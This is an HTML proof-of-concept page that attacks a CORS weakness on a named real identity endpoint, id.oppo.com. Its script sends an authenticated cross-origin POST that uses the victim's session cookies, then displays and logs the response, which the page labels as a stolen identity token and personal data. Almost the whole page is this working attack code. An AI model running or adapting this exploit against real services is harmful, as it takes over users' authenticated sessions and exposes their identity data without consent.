<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit PoC - Identity Auth CORS</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; padding: 20px; max-width: 900px; margin: auto; background-color: #0d1117; color: #c9d1d9; }
        .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { color: #f85149; border-bottom: 1px solid #30363d; padding-bottom: 15px; margin-top: 0; }
        .info { background: #1f2428; padding: 10px; border-left: 4px solid #f85149; margin-bottom: 20px; font-size: 14px; }
        textarea { width: 100%; height: 120px; margin: 10px 0; padding: 12px; border: 1px solid #30363d; border-radius: 6px; background: #0d1117; color: #b1bac4; font-family: 'Courier New', monospace; box-sizing: border-box; }
        button { background-color: #238636; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; transition: 0.2s; }
        button:hover { background-color: #2ea043; }
        .result-box { margin-top: 25px; padding: 15px; background: #000; color: #39ff14; border: 1px solid #30363d; border-radius: 6px; min-height: 80px; word-break: break-all; font-family: 'Courier New', monospace; white-space: pre-wrap; }
        .label { font-weight: bold; margin-top: 15px; display: block; color: #8b949e; }
        code { color: #58a6ff; }
    </style>
</head>
<body>

<div class="container">
    <h1>CORS Identity Data Exfiltration</h1>
    <div class="info">
        <strong>Target Endpoint:</strong> <code>https://id.oppo.com/identity/web/v1/authn/auth</code>
    </div>
    
    <label class="label">Step 1: Paste Request Body (Encrypted Auth Data):</label>
    <textarea id="payloadInput" placeholder='{"data":"..."} or raw encrypted string'></textarea>
    
    <button onclick="runExploit()">Trigger Authenticated Request</button>

    <label class="label">Step 2: Captured Response (Stolen Identity Token/PII):</label>
    <div id="result" class="result-box">Waiting for execution...</div>
</div>

<script>
    function runExploit() {
        const resultDiv = document.getElementById("result");
        const payload = document.getElementById("payloadInput").value;
        // Updated target URL as per your new information
        const targetUrl = "https://id.oppo.com/identity/web/v1/authn/auth";

        if (!payload) {
            alert("Please provide the authentication payload first!");
            return;
        }

        resultDiv.innerText = "Attacking... Sending authenticated cross-origin request.";
        resultDiv.style.color = "#39ff14";

        const xhr = new XMLHttpRequest();
        xhr.open("POST", targetUrl, true);
        
        // IMPORTANT: This allows us to use the victim's session cookies for id.oppo.com
        xhr.withCredentials = true; 
        
        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    // Success means the browser allowed reading the response from id.oppo.com
                    resultDiv.innerText = "SUCCESS: Response Captured!\n\n" + xhr.responseText;
                    console.log("Stolen Auth Data:", xhr.responseText);
                } else {
                    resultDiv.innerText = "FAILED: Status " + xhr.status + "\nThis might be due to session timeout or CORS blocking the specific origin.";
                    resultDiv.style.color = "#f85149";
                    console.error("XHR Error:", xhr.status, xhr.statusText);
                }
            }
        };

        xhr.send(payload);
    }
</script>
